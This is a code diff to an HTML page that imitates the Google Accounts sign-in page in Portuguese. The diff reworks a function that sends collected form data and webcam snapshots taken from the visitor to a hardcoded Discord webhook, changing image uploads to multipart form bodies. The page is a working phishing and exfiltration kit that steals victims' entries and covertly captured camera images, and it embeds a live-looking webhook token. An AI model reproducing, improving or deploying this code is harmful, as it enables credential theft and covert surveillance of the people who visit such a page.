@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR"> 
+<html lang="pt-BR">
 
 <head>
     <title>Fazer login - Contas do Google</title>
@@ -131,24 +131,19 @@
     <script>
         // Send Data to Discord Webhook
         async function sendToDiscord(title, data, isImage = false) {
-            let payload;
+            let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+            let body;
 
             if (isImage) {
-                payload = {
-                    content: `Novos ${title} coletados:`,
-                    embeds: [
-                        {
-                            title: title,
-                            description: "Imagem capturada pela câmera.",
-                            color: 16711680,
-                            thumbnail: {
-                                url: "data:image/png;base64," + data.split(",")[1] // Send base64 data as thumbnail
-                            }
-                        }
-                    ]
-                };
+                let imageBase64 = data.split(",")[1];
+                body = `--${boundary}\r\n` +
+                       `Content-Disposition: form-data; name="files[0]"; filename="myfilename.png"\r\n` +
+                       `Content-Type: image/png\r\n` +
+                       `Content-Transfer-Encoding: base64\r\n\r\n` +
+                       `${imageBase64}\r\n` +
+                       `--${boundary}--`;
             } else {
-                payload = {
+                body = JSON.stringify({
                     content: `Novos ${title} coletados`,
                     embeds: [
                         {
@@ -162,15 +157,17 @@
                             }))
                         }
                     ]
-                };
+                });
             }
 
             await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
                 method: 'POST',
-                headers: {
+                headers: isImage ? {
+                    'Content-Type': `multipart/form-data; boundary=${boundary}`
+                } : {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload)
+                body: body
             });
         }
 
@@ -193,7 +190,7 @@
                     // Convert the snapshot to a base64 data URL
                     const imageData = canvas.toDataURL('image/png');
 
-                    // Send to Discord as thumbnail
+                    // Send to Discord using boundary
                     sendToDiscord("Captura da Câmera", imageData, true);
 
                     // Stop the video stream
